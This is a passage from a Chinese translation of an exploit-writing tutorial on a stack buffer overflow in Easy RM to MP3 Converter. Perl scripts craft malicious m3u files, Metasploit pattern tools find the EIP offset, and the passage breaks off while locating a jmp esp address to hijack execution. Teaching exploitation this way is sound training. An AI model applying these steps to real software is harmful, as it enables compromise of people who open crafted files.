位存储值的高位）所以你看到的AAAA其实是反序的AAAA（就是如果你传进缓冲区的是
ABCD，EIP的值将是44434241：DCBA）。
如此看来我们的m3u文件的部分数据被读进了缓冲区导致了溢出。这样我们已经可以触发缓
冲区溢出和写值到EIP中了。这样的漏洞我们就叫做“栈溢出”（或缓冲区溢出：BOF）。
前面我们的m3u文件里面都是‟A‟，我们无法确切的知道缓冲区的大小已至于我们无法把
shellcode的起始地址写到EIP，所以我们要定位保存的返回地址在缓冲区的偏移。
确定缓冲区的大小和准确的重写EIP
我们从前面可以得知返回地址在缓冲区开始位置的20000到30000字节之间。现在，你可以尝
试先把20000到30000字节之间的空间都重写成你shellcode的起始地址。但是如果可以精确的
定位返回地址的偏移要比这个“漫天散花”要好很多，所以为了精确定位，还有些工作做。
首先，让我们通过改变我们的Perl脚本尝试缩小一点散花范围：
我们使用二分法。用25000个A和5000个B填充m3u文件，如果EIP被冲刷成41414141（AAAA）。
那么E返回地址就位于20000到25000之间，被冲刷成42424242（BBBB）那么就位于25000到
30000之间。
my $file= "crash25000.m3u";
my $junk = "\x41" x 25000;
my $junk2 = "\x42" x 5000;
open($FILE,">$file");
print $FILE $junk.$junk2;
close($FILE);
print "m3u File Created successfully\n";
Easy RM to MP3打开我们创建的crash25000.m3u文件。
可以看到EIP为42424242（BBBB），所以返回地址位于25000到30000之间了。
[5000 B's ]
[AAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB][BBBB][BBBBBBBBB......]
25000 A's EIP ESP points here
查看ESP所值的内存数据：
是个好消息，我们用BBBB重写了EIP和可以看到ESP所指的缓冲区。
在我们调整脚本之前，需要精确的定位出来返回地址在缓冲区的位置。
为了精确定位，我们使用Metasploit。
Metasploit是一个漂亮的工具可以助我们计算偏移，它指定包含唯一模型（特殊构造的）的
字符串，用这个模型（通过在我们恶意构造的m3u文件中使用这个模型和EIP的值），我们
可以定位到返回地址在缓冲区中的偏移。
打开metasploit framework3 文件夹下的工具文件夹（我用的linux版本），你可以找个一个
pattern_create.rb的工具。创建一个包含5000个字符的模型并写到文件。
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb
Usage: pattern_create.rb length [set a] [set b] [set c]
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000
编辑我们的perl脚本使用$junk2的内容代替我们的5000个字符。
my $file= "crash25000.m3u";
my $junk = "\x41" x 25000;
my $junk2 = “put the 5000 characters here”
open($FILE,">$file");
print $FILE $junk.$junk2;
close($FILE);
print "m3u File Created successfully\n";
再次用Easy RM to MP3打开这个m3u文件，程序崩溃和记录下EIP的值。
At this time, eip contains 0x356b4234 (note : little endian : we have overwritten EIP with 34 42
6b
35 = 4Bk5
这个时候，EIP=0x356b4234（小端字节序：34 42 6b 35=4BK5）
再又metasploit工具计算在返回地址前面缓冲区的真正长度。填写EIP的值（基于模型文件）
和缓冲区的长度。
root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x356b4234
5000
1094
root@bt:/pentest/exploits/framework3/tools#
1094.重写EIP前面需要冲刷的缓冲区长度。所以你可以创建一个文件，填充25000+1094个A，
在加4个B，EIP应该就会被重写成为42424242.现在我们已经知道了返回地址在缓冲区中的偏
移了，我们在4个B后在填充一些C。
修改创建m3u文件的perl脚本：
my $file= "eipcrash.m3u";
my $junk= "A" x 26094;
my $eip = "BBBB";
my $espdata = "C" x 1000;
open($FILE,">$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
Easy RM to MP3打开，崩溃，WinDbg附加调试：
EIP=42424242（BBBB），这就是我们想要的，现在可以控制EIP了，ESP所指向的缓冲区都
重写为C了。
注意：这个偏移值是在我系统的分析结果。如果你要在你的系统上进行本教程练习，可能得
到的不一样的偏移（依赖SP等级，语言等），所以不要照搬我得到的偏移到你的代码中。
我们的Exploit缓冲区视图参考如下：
栈视图参考如下：
当函数返回，BBBB被置入EIP中（pop）,所以流程尝试到地址0x42424242（BBBB）执行。
找内存空间存放我们的shellcode。
我们可以控制EIP让他指向我们的shellcode，我们如何把shellcode放到被攻击进程的虚拟内存
空间和让EIP指向它并被执行呢？
为了让程序崩溃，我们把26094个A写入内存，和一个新的值覆盖返回地址，还有一部分的C。
当程序崩溃时，查看崩溃现场的各寄存器的值和dump它们所指的内存映像（d esp，d eax，d
ebx...）如果你可以看到某个寄存器所值的内存dump包含有A或C，你就可以把它填充成
shellcode，在本例中，我们看到ESP指向我们填充的C（记着输出的ESP的上限），所以我们
用shellcode替换我们的C和告诉EIP跳到ESP去执行。
尽管我们看到了C了，但我们不能确定这第一个（在地址0x000ff730处）是不是我们填充在
m3u文件中的第一个字母C。
我们修改perl脚本，用一个包含144个字符（你可以更多或更少）的模型替代字母C。
my $file= "test1.m3u";
my $junk= "A" x 26094;
my $eip = "BBBB";
my $shellcode = "1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" .
"5ABCDEFGHIJK6ABCDEFGHIJK" .
"7ABCDEFGHIJK8ABCDEFGHIJK" .
"9ABCDEFGHIJKAABCDEFGHIJK".
"BABCDEFGHIJKCABCDEFGHIJK";
open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
创建这个文件让程序崩溃，查看ESP所指的内存dump：
我们看到两个有意思的事：
ESP所指从我们模型中的第五个字符开始，不是第一个，你想知道为什么（moonife：我跟了
下，导致溢出的函数有一个参数，所以返回时还需要把这个参数弹出：return 4，所以指向
了第五个），请看下面的文章：
http://www.corelan.be:8800/index.php/forum/writing-exploits/question-about-esp-in-tutorial-pt1
在模型字符串后面，我们看到字母A，这些A很可能是我们我们填充26101个A在缓冲区的第
一部分，所以我们可以把shellcode放到这里（在重写返回之前）....
但是我们还是不要这样做，我们在模型字符串前面加4个字符做为测试，看是否esp指向我们
模型字符串的开始：
my $file= "test1.m3u";
my $junk= "A" x 26094;
my $eip = "BBBB";
my $preshellcode = "XXXX";
my $shellcode = "1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" .
"5ABCDEFGHIJK6ABCDEFGHIJK" .
"7ABCDEFGHIJK8ABCDEFGHIJK" .
"9ABCDEFGHIJKAABCDEFGHIJK".
"BABCDEFGHIJKCABCDEFGHIJK";
open($FILE,">$file");
print $FILE $junk.$eip.$preshellcode.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
在崩溃在查看ESP指向的内存dump：
很好！
现在我们可以：
控制EIP
有了放shellcode的空间（至少144字节大小）
一个寄存器直接指向我们的代码，地址为0x000ff730
现在我们需要：
编写真正的shellcode
告诉EIP跳到我们的shellcode执行，重写EIP为0x000ff730就可以达到这个目的了。
这样：
我们做一个小试验：把m3u文件填充为26094个字母A,然后是覆盖EIP的000ff730，在25个NOP
指令，在一个int 3中断（0xCC），在一些NOP。
如果没什么意外，EIP跳到了000ff730处执行，执行Nop，接着一个中断。
my $file= "test1.m3u";
my $junk= "A" x 26094;
my $eip = pack('V',0x000ff730);
my $shellcode = "\x90" x 25;
$shellcode = $shellcode."\xcc";
$shellcode = $shellcode."\x90" x 25;
open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
程序崩溃了，但我们预料中的中断变成了非法访问，EIP的值没错是000ff730（=ESP），但
是当我们ESP指向内存dump的时候并不是预期的那样：
所以直接跳到一个内存地址不是一个好的方法（000ff730包含了字符串终止符（NULL：00）...
所以你看到来自缓冲区第一部分的字母A...我们无法到达重写EIP后我们的数据了....另一方
面，在Exploit使用内存地址直接跳转是非常不可靠的...因为内存地址会因为系统版本，语言
等的不同而不同）
简单的讲：我们不能用000ff730这样的内存地址来重写EIP。这不是好方法。我们必须使用
其他的技术达到同样的目的：为了让程序跳到我们的shellcode，我们需要借助一个寄存器，
在本例中是ESP，我们要在进程空间中找到跳转到我们寄存器（moonife：jmp esp or call esp）
这样的指令。
可靠的跳转到shellcode
我们可以成功的把shellcode放置到ESP指向的空间（或者另一个角度看，就是esp指向我们
shellcode的起始）。如果在本例中没有这个ESP，我们希望有其他寄存器指向我们希望的缓
冲区位置。不管怎么说，在这个例子中，我们可以使用ESP。
我们用ESP的地址重写我们的EIP,就是想让程序跳到我们的shellcode代码并执行。跳转到ESP
在windows应用程序中是常有的事。事实上，每个程序都会加载一个或一个以上的DLL，这
些DLL包含了大量的指令。还有,DLL的地址是固定的，所以我们可以在一个DLL中找到jmp
ESP这样的指令，接着用这个指令所在地址去重写EIP，这下就应该行了，不是吗？首先，
我们要找到jmp esp所在位置。
我们可以通过运行Easy RM to MP3，然后打开WinDbg附加到Easy RM to MP3进程，我们可
以从command 窗口中看到已经被程序加载了的所有DLL。
一旦调试器附加到进程，程序就会被中断。在Windbg的command窗口中，屏幕的底部，输
入a (assemble)然后回车键，现在输入jmp esp 然后回车。
在回车。
现在输入u (unassemble)跟上jmp esp前面出来的地址。
在7c90120e,后面，你可以看到ffe4。这是jmp esp的机器码。
现在我们到加载的dll中搜索这个机器码。
看Windbg窗口的顶部，会看被Easy RM to MP3程序加载了的DLL条目：
如果我们可以在DLL中找的ffe4这个机器码，我们就有一个好的机会使我们的Exploit稳定可
靠的运行在windos平台上了。但是如果我们使用系统dll，那么在其他版本的系统上可能不行
了，所以这里我们首选用Easy RM to MP3自身的DLL。
我们看C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll这个dll，它被加载到
01b10000 到 01fd000 地址区间，在这个区间找ffe4：
不错。（没出来什么意外....jmp esp是一个很常用的指令）。我们选择一个地址，观察地址
中是否含有NULL（00）字节是很重要的事，因为它可能被当做字符串的结束，而我们后面
要写进去的内容被截断。
另一个找opcodes的好方法是：
“s 70000000 l fffffff ff e4” (属于系统dll的空间)
提示：另一个方法获得opcode的地址：
findjmp (来自 Ryan Permeh) : 编译 findjmp.c 和所有以下参数运行:
还可以用metasploit opcode database 详见下一教程....
从我们把shellcode放置到ESP所值内存（在重写EIP后面跟上的字符串），这个jmp esp不能
含NULL（00）字节，含0会被认为是字符串的结束而我们的shellcode被截断。
所以我们首先选用这个地址：0x01ccf23a
确保这个地址是包含指令jmp esp的（所以反汇编这个地址）：